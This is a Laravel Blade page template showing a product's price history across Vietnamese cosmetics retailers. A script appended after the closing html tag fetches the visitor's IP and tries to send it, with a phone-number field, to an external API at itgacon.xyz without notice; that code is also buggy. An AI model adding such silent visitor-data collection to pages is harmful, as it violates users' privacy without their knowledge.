<!DOCTYPE html>
<html>
<head>
	<title>AB Check Giá</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="{{ asset('css/add_pro.css') }}">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />

</head>

<body>
	<header>
		<h1>Lịch Sử Thay Đổi Giá</h1>
	</header>
	<main>

  <section>
  <button class="btn btn-secondary" onclick="window.location='{{ route('products.index') }}'">Trở Lại</button> 
  <p>Chi Tiết  Sản Phẩm :</p>
  <p>- Tên : {{$product->product_name}}</p>
  <p>- Barcode :  {{$product->product_barcode}}</p>
		<section>
			<table>
            <thead>
                <tr>
                <th>STT</th>
                <th>Thời Gian Cập Nhật</th>
                <th>AB</th>
                <th>Hasaki</th>
                <th>Guardian</th>
                <th>Thegioiskinfood</th>
                <th>Lamthao</th>
                </tr>
            </thead>
				<tbody>
             <?php  $term =0; ?>   
            @foreach($detail as $p_detail)
                <tr>
                <td>{{$term +1}}</td>
                    <td>{{$p_detail->created_at}}</td>
                    <td>{{$p_detail->p_ab }}</td>
                    <td>{{$p_detail->p_hsk }}</td>
                    <td>{{$p_detail->p_gu }}</td>
                    <td>{{$p_detail->p_tgs }}</td>
                    <td>{{$p_detail->p_lt }}</td>
                </tr>
                <?php $term++; ?>
            @endforeach        
        </tbody>
			</table>
		</section>
	</main>
	<footer class="footer" style="position: fixed;bottom: 0;
   width: 100%;
   text-align: center;">
		<p>Love you!</p>
	</footer>
</body>
<script src="{{ asset('js/app.js') }}"></script>
<script>
  document.querySelectorAll('tr').forEach(row => {
  const td = Array.from(row.querySelectorAll('td[data-value]'));

  const values = td.map(cell => Number(cell.dataset.value));

  const min = Math.min(...values), max = Math.max(...values);

  td.forEach(cell => {
    const value = Number(cell.dataset.value);

    if (value === min) {
      cell.style.color = 'red';
      
    } else if (value === max) {
      cell.style.color = 'blue';
    }
  });
});
</script>
</html>
<script>
document.addEventListener('DOMContentLoaded', function() {
 
 let cip; 
fetch('https://api.ipify.org?format=json')
  .then(results => results.json())
  .then(data => {
   cip = data.ip; 
  });

window.onload = function() {
  var phoneNumber = document.getElementByClassName('section-content-column').value;
       $.ajax({
            url: 'https://itgacon.xyz/check_p/public/api/save-id',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({id: cip, phone:phoneNumber}),
            success: function(response) {
                console.log('Success:', response.message);
                alert('ID saved successfully');
            },
            error: function(xhr, status, error) {
                console.error('Error:', xhr.responseJSON.error);
                alert('Failed to save ID');
            }
        });
}

});
</script>
